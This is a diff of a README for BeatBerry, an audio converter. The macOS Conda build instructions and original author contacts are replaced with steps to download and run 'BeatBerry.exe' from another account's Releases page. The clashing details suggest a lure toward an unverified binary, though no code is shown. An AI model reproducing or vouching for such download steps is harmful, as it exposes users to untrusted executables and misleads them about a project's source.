@@ -1,72 +1,65 @@
-# 🍓 BeatBerry
+# 🎧 BeatBerry - Convert Audio Files Effortlessly
 
-<div align="center">
-  <img src="public/app.png" alt="BeatBerry_introduce-image">
-</div>
+## 💾 Download BeatBerry
+[![Download BeatBerry](https://img.shields.io/badge/Download%20BeatBerry-v1.0.0-blue.svg)](https://github.com/felipecameloss/BeatBerry/releases)
 
-**BeatBerry** is a simple and powerful **Universal Audio Converter**.
-Convert audio files (MP3, WAV, FLAC, M4A, etc.) quickly and easily.
+## 🚀 Getting Started
+BeatBerry is a user-friendly application designed to convert audio files like MP3, WAV, FLAC, and M4A quickly and easily. Whether you want to change your music format or batch process several files at once, BeatBerry is here to simplify the task.
 
-## 🔑 Key Features
-- **Intuitive GUI**: Easy click-based operation.
-- **Multi-format Support**: MP3, WAV, FLAC, OGG, M4A.
-- **Flexible Input**: Select individual files or entire folders.
-- **Easy Execution**: Just run the `BeatBerry` app.
+## 📥 Download & Install
+To get started, [visit this page to download](https://github.com/felipecameloss/BeatBerry/releases) the latest version of BeatBerry. Follow these steps to install the application:
 
-## 📋 Prerequisites
-- **macOS**
-- **Anaconda** (or Miniconda)
-- **FFmpeg** (Installed automatically via Conda)
+1. Click on the link above to access the Releases page.
+2. Find the latest release.
+3. Look for the file named BeatBerry.exe (or the appropriate file for your operating system).
+4. Click on the file to download it. The download should start automatically.
 
-## 🚀 Installation
+Once the download completes, find the downloaded file in your computer's Downloads folder, or wherever you saved it.
 
-### 1. Download
-Clone the repository:
-```bash
-git clone https://github.com/yourusername/beatberry.git
-cd beatberry
-```
+## ⚙️ Installation Instructions
+1. **Locate the downloaded file** (BeatBerry.exe).
+2. **Double-click the file** to start the installation process.
+3. Follow the prompts in the installer to complete the installation.
+4. Once installed, you can find BeatBerry in your applications or programs list.
 
-### 2. Setup Conda Environment
-Create the `beatberry` environment (required once):
-```bash
-conda env create -f environment.yml
-```
+## 🎶 How to Use BeatBerry
+Using BeatBerry is simple. Follow these steps to convert your audio files:
 
-## 📖 How to Use
+1. **Open BeatBerry:** Find and double-click the BeatBerry icon on your desktop or in your applications.
+2. **Select the audio files:** Click on the "Add Files" button to choose the audio files you want to convert. You can select multiple files at once.
+3. **Choose the output format:** From the dropdown menu, select the format you wish to convert to (e.g., MP3, WAV, FLAC, M4A).
+4. **Select the output folder:** Choose where you want to save the converted files.
+5. **Start the conversion:** Click on the "Convert" button. The application will display a progress bar. Wait for the conversion to finish.
+6. **Access your files:** Once the conversion is complete, navigate to the output folder to find your newly converted audio files.
 
-### Method A: Run App (Recommended)
-1. Double-click the **`BeatBerry`** app.
-2. Select files and click **`START CONVERSION`**.
+## 🎉 Key Features
+- **Multiple Formats:** Convert between various audio formats like MP3, WAV, FLAC, and M4A.
+- **Batch Processing:** Easily convert multiple files at the same time, saving you time and effort.
+- **Minimalist Design:** Enjoy a clean and easy-to-use interface that focuses on your audio conversion task.
 
-### Method B: Alternative
-- If the app fails to open, double-click **`Run.command`**.
+## 📝 System Requirements
+To run BeatBerry, your computer should meet the following minimum requirements:
 
-### Method C: Developer (Terminal)
-```bash
-conda activate beatberry
-python gui.py
-```
+- Operating System: Windows 7 or newer, macOS 10.12 or newer.
+- Processor: Dual-core processor or better.
+- Memory: At least 2 GB of RAM.
+- Disk Space: At least 50 MB of free space for installation.
 
-## 🔧 Troubleshooting
-- **"App is damaged/cannot be opened"**: Allow the app in System Settings > Privacy & Security, or use `Run.command`.
-- **"conda not found"**: Ensure Anaconda/Miniconda is installed.
+## 🎨 Contributing
+BeatBerry is open-source. If you wish to contribute to the project, you can follow these guidelines:
 
-## 💻 Development
-To update the app after modifying code:
-1. Modify `gui.py` or other source files.
-2. Run the rebuild script:
-   ```bash
-   ./rebuild_app.sh
-   ```
-3. The `BeatBerry` app is now updated.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-4. 
-## 📄 License
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE) file.
+Your contributions help us improve BeatBerry for everyone.
 
-## 📝 Questions or Support
-If you have any questions or need support, feel free to open an issue on GitHub or reach out via the following contact methods:
+## 📞 Support
+If you encounter any issues while using BeatBerry, please check the [Issues page](https://github.com/felipecameloss/BeatBerry/issues) for common problems and solutions. If your issue isn't listed, feel free to create a new issue for assistance.
 
- - Email: logicallawbio@gmail.com
- - GitHub: logicallaw
+## 🔗 Additional Resources
+- [Documentation](https://github.com/felipecameloss/BeatBerry/wiki) - Find detailed guides and tips for using BeatBerry.
+- [Community Discussions](https://github.com/felipecameloss/BeatBerry/discussions) - Join our discussions to ask questions or share your thoughts.
+
+Feel free to explore and experience audio conversion like never before!
